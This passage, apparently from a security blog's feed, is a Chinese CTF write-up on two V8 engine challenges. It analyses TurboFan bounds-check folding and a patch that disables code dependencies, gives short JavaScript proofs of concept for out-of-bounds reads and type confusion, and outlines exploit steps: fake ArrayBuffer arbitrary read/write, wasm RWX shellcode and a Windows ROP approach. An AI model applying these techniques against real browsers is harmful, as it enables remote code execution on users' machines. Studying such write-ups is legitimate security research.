phase<br>我们得到的IR是这样的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-113657.png" alt=""><br>代码在<code>JSNativeContextSpecialization::BuildElementAccess</code>里<br>首先判断是否是<code>load_mode=LOAD_IGNORE_OUT_OF_BOUNDS</code><br>比较简单的一种情况就是array的index超出了array的length。<br>这样我们需要对index进行check，看是否超出了Smi::kMaxValue，引入了上面的CheckBounds节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we might need to grow the &#123;elements&#125; backing store.</span></span><br><span class="line"><span class="keyword">if</span> (keyed_mode.IsStore() &amp;&amp; IsGrowStoreMode(keyed_mode.store_mode())) &#123;</span><br><span class="line">  <span class="comment">// For growing stores we validate the &#123;index&#125; below.</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyed_mode.IsLoad() &amp;&amp;</span><br><span class="line">           keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">           CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is a valid array index, we do the actual</span></span><br><span class="line">  <span class="comment">// bounds check below and just skip the store below if it's out of</span></span><br><span class="line">  <span class="comment">// bounds for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect = graph()-&gt;NewNode(</span><br><span class="line">      simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">      jsgraph()-&gt;Constant(Smi::kMaxValue), effect, control);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is in the valid range for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect =</span><br><span class="line">      graph()-&gt;NewNode(simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">                       length, effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后还需要对index进行实际的check，也就是比较index是否小于array length，引入了一个NumberLessThan节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we can return undefined for out-of-bounds loads.</span></span><br><span class="line">      <span class="keyword">if</span> (keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">          CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">        Node* check =</span><br><span class="line">            graph()-&gt;NewNode(simplified()-&gt;NumberLessThan(), index, length);</span><br><span class="line">        Node* branch = graph()-&gt;NewNode(</span><br><span class="line">            common()-&gt;Branch(BranchHint::kTrue,</span><br><span class="line">                             IsSafetyCheck::kCriticalSafetyCheck),</span><br><span class="line">            check, control);</span><br><span class="line"></span><br><span class="line">        Node* if_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), branch);</span><br><span class="line">        Node* etrue = effect;</span><br><span class="line">        Node* vtrue;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// Perform the actual load</span></span><br><span class="line">          vtrue = etrue =</span><br><span class="line">              graph()-&gt;NewNode(simplified()-&gt;LoadElement(element_access),</span><br><span class="line">                               elements, index, etrue, if_true);</span><br></pre></td></tr></table></figure></p><p>然后这个节点在LoadElimination进行TyperNarrowingReducer的时候。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">  <span class="keyword">case</span> IrOpcode::kNumberLessThan: &#123;</span><br><span class="line">    <span class="comment">// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational</span></span><br><span class="line">    <span class="comment">// comparisons with the operation typer).</span></span><br><span class="line">    Type left_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type right_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (left_type.Is(Type::PlainNumber()) &amp;&amp;</span><br><span class="line">        right_type.Is(Type::PlainNumber())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (left_type.Max() &lt; right_type.Min()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_true();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left_type.Min() &gt;= right_type.Max()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_false();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>由于left_type即index的type信息被分析为(4,4)，right_type即array length的type信息被分析为（4,4)<br>满足<code>else if (left_type.Min() &gt;= right_type.Max())</code><br>所以kNumberLessThan的类型会被更新成false，然后在ConstantFoldingReducer时候<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Reduction ConstantFoldingReducer::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  <span class="comment">// Check if the output type is a singleton.  In that case we already know the</span></span><br><span class="line">  <span class="comment">// result value and can simply replace the node if it's eliminable.</span></span><br><span class="line">  <span class="keyword">if</span> (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp;</span><br><span class="line">      node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123;</span><br><span class="line">    <span class="comment">// TODO(v8:5303): We must not eliminate FinishRegion here. This special</span></span><br><span class="line">    <span class="comment">// case can be removed once we have separate operators for value and</span></span><br><span class="line">    <span class="comment">// effect regions.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;opcode() == IrOpcode::kFinishRegion) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="comment">// We can only constant-fold nodes here, that are known to not cause any</span></span><br><span class="line">    <span class="comment">// side-effect, may it be a JavaScript observable side-effect or a possible</span></span><br><span class="line">    <span class="comment">// eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have</span></span><br><span class="line">    <span class="comment">// the Operator::kNoDeopt property).</span></span><br><span class="line">    Type upper = NodeProperties::GetType(node);</span><br><span class="line">    <span class="keyword">if</span> (!upper.IsNone()) &#123;</span><br><span class="line">      Node* replacement = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (upper.IsHeapConstant()) &#123;</span><br><span class="line">        replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref());</span><br></pre></td></tr></table></figure></p><p>被直接折叠成了false节点。<br>最后只剩下了对Smi::kMaxValue的CheckBounds。<br>然而这对我们来说毫无意义。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-115435.png" alt=""><br>所以我们的第一步就是构造PoC，bypass掉ConstantFoldingReducer，这一步其实非常简单，只要让NumberLessThan在TyperNarrowingReducer的时候，不被类型更新成false就可以了。</p><h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-121438.png" alt=""><br>idx的range取决于20和16号节点，如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#21:SpeculativeNumberBitwiseAnd[SignedSmall](#16:NumberConstant, #20:NumberConstant, #17:Checkpoint, #12:JSStackCheck)  [Type: Range(0, 4)]</span><br><span class="line">#20:NumberConstant[65535]()  [Type: Range(65535, 65535)]</span><br><span class="line">#16:NumberConstant[4]()  [Type: Range(4, 4)]</span><br></pre></td></tr></table></figure></p><p>经过以下的typer分析得到range为(0,4)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">SPECULATIVE_NUMBER_BINOP(NumberBitwiseAnd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECULATIVE_NUMBER_BINOP(Name)                         \</span></span><br><span class="line">  Type OperationTyper::Speculative##Name(Type lhs, Type rhs) &#123; \</span><br><span class="line">    lhs = SpeculativeToNumber(lhs);                            \</span><br><span class="line">    rhs = SpeculativeToNumber(rhs);                            \</span><br><span class="line">    <span class="keyword">return</span> Name(lhs, rhs);                                     \</span><br><span class="line">  &#125;</span><br><span class="line">---&gt;</span><br><span class="line">Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) &#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToInt32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> lmin = lhs.Min();</span><br><span class="line">  <span class="keyword">double</span> rmin = rhs.Min();</span><br><span class="line">  <span class="keyword">double</span> lmax = lhs.Max();</span><br><span class="line">  <span class="keyword">double</span> rmax = rhs.Max();</span><br><span class="line">  <span class="keyword">double</span> min = kMinInt;</span><br><span class="line">  <span class="comment">// And-ing any two values results in a value no larger than their maximum.</span></span><br><span class="line">  <span class="comment">// Even no larger than their minimum if both values are non-negative.</span></span><br><span class="line">  <span class="keyword">double</span> max =</span><br><span class="line">      lmin &gt;= <span class="number">0</span> &amp;&amp; rmin &gt;= <span class="number">0</span> ? <span class="built_in">std</span>::min(lmax, rmax) : <span class="built_in">std</span>::max(lmax, rmax);</span><br><span class="line">  <span class="comment">// And-ing with a non-negative value x causes the result to be between</span></span><br><span class="line">  <span class="comment">// zero and x.</span></span><br><span class="line">  <span class="keyword">if</span> (lmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    min = <span class="number">0</span>;</span><br><span class="line">    max = <span class="built_in">std</span>::min(max, lmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (rmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    min = <span class="number">0</span>;</span><br><span class="line">    max = <span class="built_in">std</span>::min(max, rmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后checkbounds的range也被分析成(0,4)<br>即取index和length的range的交集。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Type OperationTyper::CheckBounds(Type index, Type length) &#123;</span><br><span class="line">  DCHECK(length.Is(cache_-&gt;kPositiveSafeInteger));</span><br><span class="line">  <span class="keyword">if</span> (length.Is(cache_-&gt;kSingletonZero)) <span class="keyword">return</span> Type::None();</span><br><span class="line">  Type mask = Type::Range(<span class="number">0.0</span>, length.Max() - <span class="number">1</span>, zone());</span><br><span class="line">  <span class="keyword">if</span> (index.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">    index = Type::Union(index, cache_-&gt;kSingletonZero, zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(index, mask, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">#<span class="number">35</span>:CheckBounds[VectorSlotPair(INVALID)](#<span class="number">21</span>:SpeculativeNumberBitwiseAnd, #<span class="number">34</span>:NumberConstant, #<span class="number">33</span>:LoadField, #<span class="number">12</span>:JSStackCheck)  [Type: Range(<span class="number">0</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure></p><p>于是NumberLessThan的left_type即CheckBounds(实际上当成index也可以理解)的范围不再是(4,4)，而是被分析成了(0,4)<br>不再满足<code>left_type.Min() &gt;= right_type.Max())</code><br>也就不会被折叠了。<br>于是最终的PoC就可以给出<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(main());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了越界读写一个element的原语,接下来就是构建完整的漏洞利用。<br>思路是：<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>详细的思路参考我写的<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a> exp。</p><h2 id="wctf-independence-day"><a href="#wctf-independence-day" class="headerlink" title="wctf independence_day"></a>wctf independence_day</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/code.cc b/src/objects/code.cc</span><br><span class="line">index <span class="number">24817</span>ca65c.<span class="number">.4079</span>f6077d <span class="number">100644</span></span><br><span class="line">--- a/src/objects/code.cc</span><br><span class="line">+++ b/src/objects/code.cc</span><br><span class="line">@@ <span class="number">-925</span>,<span class="number">6</span> +<span class="number">925</span>,<span class="number">7</span> @@ <span class="keyword">void</span> DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">                                       <span class="keyword">const</span> MaybeObjectHandle&amp; code,</span><br><span class="line">                                       Handle&lt;HeapObject&gt; object,</span><br><span class="line">                                       DependencyGroup group) &#123;</span><br><span class="line">+<span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">   Handle&lt;DependentCode&gt; old_deps(DependentCode::GetDependentCode(object),</span><br><span class="line">                                  isolate);</span><br><span class="line">   Handle&lt;DependentCode&gt; new_deps =</span><br><span class="line">@@ <span class="number">-932</span>,<span class="number">6</span> +<span class="number">933</span>,<span class="number">7</span> @@ <span class="keyword">void</span> DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">   <span class="comment">// Update the list head if necessary.</span></span><br><span class="line">   <span class="keyword">if</span> (!new_deps.is_identical_to(old_deps))</span><br><span class="line">     DependentCode::SetDependentCode(object, new_deps);</span><br><span class="line">+#endif</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Handle&lt;DependentCode&gt; DependentCode::InsertWeakCode(</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">commit <span class="number">3794e5</span>f0eeee3d421cc0d2a8d8b84ac82d37f10d</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec <span class="number">15</span> <span class="number">18</span>:<span class="number">21</span>:<span class="number">08</span> <span class="number">2018</span> +<span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    strip global in realms</span><br><span class="line"></span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index <span class="number">98b</span>c56ad25..e72f528ae5 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1043</span>,<span class="number">9</span> +<span class="number">1043</span>,<span class="number">8</span> @@ MaybeLocal&lt;Context&gt; Shell::CreateRealm(</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">delete</span>[] old_realms;</span><br><span class="line">   &#125;</span><br><span class="line">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span><br><span class="line">   Local&lt;Context&gt; context =</span><br><span class="line">-      Context::New(isolate, <span class="literal">nullptr</span>, global_template, global_object);</span><br><span class="line">+      Context::New(isolate, <span class="literal">nullptr</span>, ObjectTemplate::New(isolate), v8::MaybeLocal&lt;Value&gt;());</span><br><span class="line">   DCHECK(!try_catch.HasCaught());</span><br><span class="line">   <span class="keyword">if</span> (context.IsEmpty()) <span class="keyword">return</span> MaybeLocal&lt;Context&gt;();</span><br><span class="line">   InitializeModuleEmbedderData(context);</span><br></pre></td></tr></table></figure><p>题目给了两个patch，第一个patch是禁用了code dependencies，第二个patch应该是禁用了wasm这种利用方法。<br>要理解这个patch，就要知道v8中不止有<br>实际上注册对arr的type的dependencies的地方在ReduceElementAccess的BuildCheckMaps中，换句话说，如果我们要check的map是stableMap，就直接注册一个 compilation dependencies的回调到map中。<br>如果不是，就插入一个checkMap节点到effect chain中。<br>可以学习一下<a href="https://ssd-disclosure.com/archives/3379" target="_blank" rel="noopener">这个漏洞</a>，很有趣。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Reduction JSNativeContextSpecialization::ReduceElementAccess(</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// Perform map check on the &#123;receiver&#125;.</span></span><br><span class="line">    access_builder.BuildCheckMaps(receiver, &amp;effect, control,</span><br><span class="line">                                  access_info.receiver_maps());</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> PropertyAccessBuilder::BuildCheckMaps(</span><br><span class="line">    Node* receiver, Node** effect, Node* control,</span><br><span class="line">    ZoneVector&lt;Handle&lt;Map&gt;&gt; <span class="keyword">const</span>&amp; receiver_maps) &#123;</span><br><span class="line">  HeapObjectMatcher m(receiver);</span><br><span class="line">  <span class="keyword">if</span> (m.HasValue()) &#123;</span><br><span class="line">    MapRef receiver_map = m.Ref(broker()).<span class="built_in">map</span>();</span><br><span class="line">    <span class="keyword">if</span> (receiver_map.is_stable()) &#123;</span><br><span class="line">      <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (MapRef(broker(), <span class="built_in">map</span>).equals(receiver_map)) &#123;</span><br><span class="line">          dependencies()-&gt;DependOnStableMap(receiver_map);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ZoneHandleSet&lt;Map&gt; maps;</span><br><span class="line">  CheckMapsFlags flags = CheckMapsFlag::kNone;</span><br><span class="line">  <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span><br><span class="line">    MapRef receiver_map(broker(), <span class="built_in">map</span>);</span><br><span class="line">    maps.insert(receiver_map.object(), graph()-&gt;zone());</span><br><span class="line">    <span class="keyword">if</span> (receiver_map.is_migration_target()) &#123;</span><br><span class="line">      flags |= CheckMapsFlag::kTryMigrateInstance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *effect = graph()-&gt;NewNode(simplified()-&gt;CheckMaps(flags, maps), receiver,</span><br><span class="line">                             *effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而这个patch就是把install compile dependency的代码给禁用了，所以如果我们使用一个stable map的arr，将不会有任何的类型检查，于是就有了一个type confusion。</p><h3 id="IR分析-1"><a href="#IR分析-1" class="headerlink" title="IR分析"></a>IR分析</h3><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>非stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072849.jpg" alt=""></p><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><p>stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072916.jpg" alt=""></p><p>所以给出poc如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// make the map stable</span></span><br><span class="line">arr.x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// optimize foo</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">    foo(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// change arr to dictionary map</span></span><br><span class="line">arr[<span class="number">0x100000</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">1000</span>));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>stephen给出了一种非常精巧的漏洞利用方法，而不是使用wasm rwx内存，实际上这个迟早要被禁用。<br>通过poc我们很容易就可以得到任意地址读写的原语。<br>为了构建rop链，我们可以使用如下的方法，来自stephen，非常感谢。</p><ol><li>leak a binary pointer from the heap</li><li>read pointer to kernel32 from IAT</li><li>read kernelbase pointer from IAT of kernel32</li><li>There’s a stack pointer stored in a struct at KERNELBASE!BasepCurrentTopLevelFilter+8</li><li>ROP</li></ol><p>另外如果challenge只给了v8 binary，而是给了一个chromium的话，也可以参考我博客上关于bug-906043的漏洞利用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qwb-growupjs-amp-wctf-independence-day-writeup&quot;&gt;&lt;a href=&quot;#qwb-growupjs-amp-wctf-independence-day-writeup&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>34c3 v9 writeup</title>
    <link href="http://eternalsakura13.com/2019/04/29/v9/"/>
    <id>http://eternalsakura13.com/2019/04/29/v9/</id>
    <published>2019-04-29T05:40:51.569Z</published>
    <updated>2019-04-29T05:50:30.926Z</updated>
    
